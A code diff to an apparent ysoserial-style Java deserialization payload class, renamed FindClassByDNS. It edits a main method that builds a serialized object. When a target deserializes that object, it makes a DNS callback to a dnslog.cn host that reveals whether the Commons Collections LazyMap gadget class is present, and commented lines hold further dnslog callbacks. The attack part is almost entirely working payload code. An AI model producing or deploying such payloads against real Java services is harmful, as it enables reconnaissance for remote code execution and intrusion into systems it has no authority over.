@@ -14,6 +14,7 @@ import java.net.URL;
 import java.net.URLConnection;
 import java.net.URLStreamHandler;
 import java.util.HashMap;
+import java.util.Map;
 
 
 /**
@@ -46,7 +47,7 @@ import java.util.HashMap;
 @PayloadTest(skip = "true")
 @Dependencies()
 @Authors({ Authors.NOPOINT,Authors.C0NY1 })
-public class URLDNSFindClass implements ObjectPayload<Object> {
+public class FindClassByDNS implements ObjectPayload<Object> {
 
         public Object getObject(final String command) throws Exception {
 
@@ -98,20 +99,20 @@ public class URLDNSFindClass implements ObjectPayload<Object> {
 
     public static void main(final String[] args) throws Exception {
         //PayloadRunner.run(URLDNS1.class, args);
-//            ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("transformer.ser"));
-//            objectOutputStream.writeObject(new URLDNS1().getObject("http://a44444.e5qn3w.dnslog.cn"));
-//            objectOutputStream.close();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("/tmp/transformer.ser"));
+        objectOutputStream.writeObject(new FindClassByDNS().getObject("http://cc.mfpy4t.dnslog.cn|org.apache.commons.collections.map.LazyMap"));
+        objectOutputStream.close();
 
-//            Map<Object,Object> linkedList = new HashMap<Object, Object>();
-//            Object url = new URLDNS1().getObject("http://wee11111.up3n9z.dnslog.cn");
-//            linkedList.put(makeClass("Okkkkkkkk"),url);
+//        Map<Object,Object> linkedList = new HashMap<Object, Object>();
+//        Object url = new FindClassByDNS().getObject("http://wee11111.up3n9z.dnslog.cn");
+//        linkedList.put(makeClass("Okkkkkkkk"),url);
 //
 //
-//            ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("transformer.ser"));
-//            objectOutputStream.writeObject(linkedList);
-//            objectOutputStream.close();
+//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("transformer.ser"));
+//        objectOutputStream.writeObject(linkedList);
+//        objectOutputStream.close();
 
-        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("transformer.ser"));
-        objectInputStream.readObject();
+//        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("transformer.ser"));
+//        objectInputStream.readObject();
     }
 }
